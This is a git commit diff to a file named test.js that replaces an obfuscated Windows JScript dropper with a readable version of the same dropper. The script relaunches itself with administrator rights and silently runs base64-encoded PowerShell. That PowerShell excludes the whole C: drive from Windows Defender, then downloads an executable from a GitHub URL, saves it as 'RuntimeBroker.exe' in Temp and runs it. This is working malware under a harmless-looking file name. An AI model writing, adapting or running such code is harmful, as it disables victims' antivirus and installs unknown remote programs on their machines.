435c8d789be6a6011c5333a308d101a5b7da5a0c
blowdeytop <blowdeytop@gmail.com>
2025-03-28 05:17:21 -0500

    Update test.js

--- test.js
+++ test.js
@@ -1,34 +1,26 @@
 (function() {
-    var _0x1a2b = function(a, b) {
-        var c = function(d) {
-            while (--d) { a.push(a.shift()); }
-        };
-        c(++b);
-        return a;
-    };
+    var shell = new ActiveXObject("WScript.Shell");
+    var shellApp = new ActiveXObject("Shell.Application");
 
-    var _0x2b3c = _0x1a2b(['Shell.Application', 'Wscript.Shell', 'run', 'Arguments', 'Exists', 'FullName', 'ScriptFullName', 'runas'], 0);
-
-    function _0x3d4e() {
-        if (!WScript[_0x2b3c[3]][_0x2b3c[4]]('elevate')) {
-            new ActiveXObject(_0x2b3c[0])[_0x2b3c[6]](_0x2b3c[5], '"' + WScript[_0x2b3c[6]] + '" /elevate', '', _0x2b3c[7], 1);
+    function ensureElevatedPrivileges() {
+        if (!WScript.Arguments.Named.Exists("elevate")) {
+            shellApp.ShellExecute(WScript.FullName, '"' + WScript.ScriptFullName + '" /elevate', "", "runas", 1);
             WScript.Quit();
         }
     }
 
-    function _0x4e5f() {
-        _0x3d4e();
-        var _0x5f6g = new ActiveXObject(_0x2b3c[1]);
-        var _0x6h7i = [
+    function executeEncodedCommands() {
+        var commands = [
             "cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA",
             "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==",
-            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcwBwAG0AbwB0AHcAaQBuAC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAEMAbABpAGUAbgB0AC0AYgB1AGkAbAB0AC4AZQB4AGUAIgANAAoAJABvAHUAdABwAHUAdAAgAD0AIAAiACQAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG9AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA="
+            "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AYgBsAG8AdwBkAGUAeQB0AG8AcAAvAHQAcABtAG8AdAB3AGkAbgAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBDAGwAaQBlAG4AdAAtAGIAdQBpAGwAdAAuAGUAeABlACIADQAKACQAbwB1AHQAcAB1AHQAIAAlAHcAZQBuAHYAOgBUAGUAbQBwAC8AUgB1AG4AdABpAG0AZQBCAHIAbwBrAGUAcgAuAGUAeABlACIADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABvAHUAdABwAHUAdAA="
         ];
 
-        _0x6h7i.forEach(function(cmd) {
-            _0x5f6g[_0x2b3c[2]]("powershell -enc " + cmd, 0, false);
-        });
+        for (var i = 0; i < commands.length; i++) {
+            shell.Run("powershell -enc " + commands[i], 0, false);
+        }
     }
 
-    _0x4e5f();
+    ensureElevatedPrivileges();
+    executeEncodedCommands();
 })();
